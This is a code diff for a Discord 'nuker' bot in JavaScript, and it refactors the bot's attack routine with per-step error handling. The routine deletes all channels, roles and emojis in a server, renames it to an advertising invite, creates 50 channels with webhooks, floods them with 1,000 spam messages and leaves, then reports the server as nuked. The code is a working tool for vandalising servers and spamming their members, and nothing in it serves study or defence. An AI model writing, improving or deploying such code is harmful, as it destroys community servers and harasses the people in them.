@@ -50,7 +50,6 @@ async function handleRateLimit(promiseFn, maxRetries = 5) {
   return null;
 }
 
-// ====== BOT LOGIC ======
 client.on('ready', () => {
   console.log(`🚀 Logged in as ${client.user.tag}`);
 });
@@ -64,98 +63,157 @@ client.on('messageCreate', async (message) => {
   const webhookAvatar = 'https://i.imgur.com/6QbX6yA.png ';
 
   try {
-    console.log('🧹 Starting cleanup...');
+    console.log(`🎯 Targeting server: ${guild.name}`);
 
-    // Delete all channels
-    await Promise.all(guild.channels.cache.map(async (channel) => {
-      const result = await handleRateLimit(() => channel.delete().catch(e => console.warn(`Channel del fail: ${e.message}`)));
-      if (result) console.log(`🗑️ Deleted channel: ${channel.name}`);
-    }));
+    let didSomething = false;
 
-    // Delete roles (except @everyone)
-    await Promise.all(guild.roles.cache.map(async (role) => {
-      if (role.name !== '@everyone' && !role.managed) {
-        const result = await handleRateLimit(() => role.delete().catch(e => console.warn(`Role del fail: ${e.message}`)));
-        if (result) console.log(`🛡️ Deleted role: ${role.name}`);
-      }
-    }));
+    // Step 1: Delete channels
+    try {
+      console.log('🧹 Deleting channels...');
+      await Promise.all(guild.channels.cache.map(async (channel) => {
+        const result = await handleRateLimit(() =>
+          channel.delete().catch(e => console.warn(`Channel del fail: ${e.message}`))
+        );
+        if (result) {
+          console.log(`🗑️ Deleted channel: ${channel.name}`);
+          didSomething = true;
+        }
+      }));
+    } catch (err) {
+      console.warn('⚠️ Failed to delete channels:', err.message);
+    }
 
-    // Delete emojis
-    await Promise.all(guild.emojis.cache.map(async (emoji) => {
-      const result = await handleRateLimit(() => emoji.delete().catch(e => console.warn(`Emoji del fail: ${e.message}`)));
-      if (result) console.log(`🖼️ Deleted emoji: ${emoji.name}`);
-    }));
+    // Step 2: Delete roles
+    try {
+      console.log('🛡️ Deleting roles...');
+      await Promise.all(guild.roles.cache.map(async (role) => {
+        if (role.name !== '@everyone' && !role.managed) {
+          const result = await handleRateLimit(() =>
+            role.delete().catch(e => console.warn(`Role del fail: ${e.message}`))
+          );
+          if (result) {
+            console.log(`🗑️ Deleted role: ${role.name}`);
+            didSomething = true;
+          }
+        }
+      }));
+    } catch (err) {
+      console.warn('⚠️ Failed to delete roles:', err.message);
+    }
 
-    // Rename server
-    await handleRateLimit(() => guild.edit({ name: 'discord.gg/migh' }).catch(e => console.warn(`Guild rename fail: ${e.message}`)));
-    console.log('📛 Server renamed.');
+    // Step 3: Delete emojis
+    try {
+      console.log('🖼️ Deleting emojis...');
+      await Promise.all(guild.emojis.cache.map(async (emoji) => {
+        const result = await handleRateLimit(() =>
+          emoji.delete().catch(e => console.warn(`Emoji del fail: ${e.message}`))
+        );
+        if (result) {
+          console.log(`🗑️ Deleted emoji: ${emoji.name}`);
+          didSomething = true;
+        }
+      }));
+    } catch (err) {
+      console.warn('⚠️ Failed to delete emojis:', err.message);
+    }
 
-    // Create 50 channels
-    const createdChannels = [];
-    for (let i = 0; i < 50; i++) {
-      const channel = await handleRateLimit(() =>
-        guild.channels.create({ name: `${channelName}-${i + 1}` })
-          .catch(e => console.warn(`Channel create fail: ${e.message}`))
+    // Step 4: Rename server
+    try {
+      console.log('📛 Renaming server...');
+      await handleRateLimit(() =>
+        guild.edit({ name: 'discord.gg/migh' }).catch(e => console.warn(`Rename fail: ${e.message}`))
       );
-      if (channel) {
-        createdChannels.push(channel);
-        console.log(`🆕 Created channel: ${channel.name}`);
+      console.log('✅ Server renamed.');
+      didSomething = true;
+    } catch (err) {
+      console.warn('⚠️ Failed to rename server:', err.message);
+    }
+
+    // Step 5: Create new channels
+    const createdChannels = [];
+    try {
+      console.log('🆕 Creating new channels...');
+      for (let i = 0; i < 50; i++) {
+        const channel = await handleRateLimit(() =>
+          guild.channels.create({ name: `${channelName}-${i + 1}` })
+            .catch(e => console.warn(`Channel create fail: ${e.message}`))
+        );
+        if (channel) {
+          createdChannels.push(channel);
+          console.log(`✅ Created channel: ${channel.name}`);
+          didSomething = true;
+        }
       }
+    } catch (err) {
+      console.warn('⚠️ Failed to create channels:', err.message);
     }
 
     if (createdChannels.length === 0) {
-      console.error('❌ No channels created. Aborting.');
-      return message.channel.send('❌ Failed to create any channels. Aborting.');
-    }
-
-    // Create webhooks
-    const webhooks = [];
-    for (const channel of createdChannels) {
-      const hook = await handleRateLimit(() =>
-        channel.createWebhook({ name: 'Nebula', avatar: webhookAvatar })
-          .catch(e => console.warn(`Webhook create fail: ${e.message}`))
-      );
-      if (hook) {
-        webhooks.push(hook);
-        console.log(`📎 Created webhook in: ${channel.name}`);
-      }
-    }
-
-    if (webhooks.length === 0) {
-      console.error('❌ No webhooks created. Aborting spam.');
-      return message.channel.send('❌ No webhooks could be created. Aborting.');
-    }
-
-    // Spam messages
-    const totalMessages = 1000;
-    const perHook = Math.ceil(totalMessages / webhooks.length);
-    let sent = 0;
-
-    console.log('🔥 Starting spam with webhooks...');
-
-    const sendBatch = webhooks.map(webhook => async () => {
-      for (let i = 0; i < perHook && sent < totalMessages; i++) {
-        try {
-          await handleRateLimit(() => webhook.send(spamMessage));
-          sent++;
-          if (sent % 100 === 0) console.log(`📨 Messages sent: ${sent}`);
-        } catch (err) {
-          console.error(`⚠️ Failed to send via webhook: ${err.message}`);
+      console.log('❌ No channels created. Skipping spam.');
+    } else {
+      // Step 6: Create webhooks
+      const webhooks = [];
+      try {
+        console.log('📎 Creating webhooks...');
+        for (const channel of createdChannels) {
+          const hook = await handleRateLimit(() =>
+            channel.createWebhook({ name: 'Nebula', avatar: webhookAvatar })
+              .catch(e => console.warn(`Webhook create fail: ${e.message}`))
+          );
+          if (hook) {
+            webhooks.push(hook);
+            console.log(`✅ Created webhook in: ${channel.name}`);
+            didSomething = true;
+          }
         }
-        await new Promise(r => setTimeout(r, 50)); // small delay to avoid rate limit spikes
+      } catch (err) {
+        console.warn('⚠️ Failed to create webhooks:', err.message);
       }
-    });
 
-    // Run spam in parallel
-    await Promise.all(sendBatch.map(fn => fn()));
+      if (webhooks.length === 0) {
+        console.log('❌ No webhooks created. Skipping spam.');
+      } else {
+        // Step 7: Spam messages
+        const totalMessages = 1000;
+        const perHook = Math.ceil(totalMessages / webhooks.length);
+        let sent = 0;
 
-    console.log(`✅ Sent ${sent}/${totalMessages} messages.`);
+        console.log(`🔥 Starting spam with ${webhooks.length} webhooks...`);
 
-    // Leave server
-    await handleRateLimit(() => guild.leave());
-    console.log('🚪 Left server.');
+        const sendBatch = webhooks.map(webhook => async () => {
+          for (let i = 0; i < perHook && sent < totalMessages; i++) {
+            try {
+              await handleRateLimit(() => webhook.send(spamMessage));
+              sent++;
+              if (sent % 100 === 0) console.log(`📨 Sent: ${sent}`);
+            } catch (err) {
+              console.error(`⚠️ Webhook send failed: ${err.message}`);
+            }
+            await new Promise(r => setTimeout(r, 50)); // Small delay to avoid hitting limits hard
+          }
+        });
 
-    await message.channel.send(`✅ Successfully nuked \`${guild.name}\``);
+        await Promise.all(sendBatch.map(fn => fn()));
+        console.log(`✅ Sent ${sent}/${totalMessages} spam messages.`);
+        didSomething = true;
+      }
+    }
+
+    // Step 8: Leave server
+    try {
+      await handleRateLimit(() => guild.leave());
+      console.log('🚪 Left server.');
+    } catch (err) {
+      console.warn('⚠️ Failed to leave server:', err.message);
+    }
+
+    if (!didSomething) {
+      console.error('🚫 Could not perform any actions on this server.');
+      await message.channel.send('🚫 Could not perform any actions on this server.');
+    } else {
+      console.log('✅ Successfully completed operation.');
+      await message.channel.send('✅ Successfully nuked server.');
+    }
 
   } catch (err) {
     console.error('🚨 Critical error during operation:', err.message);
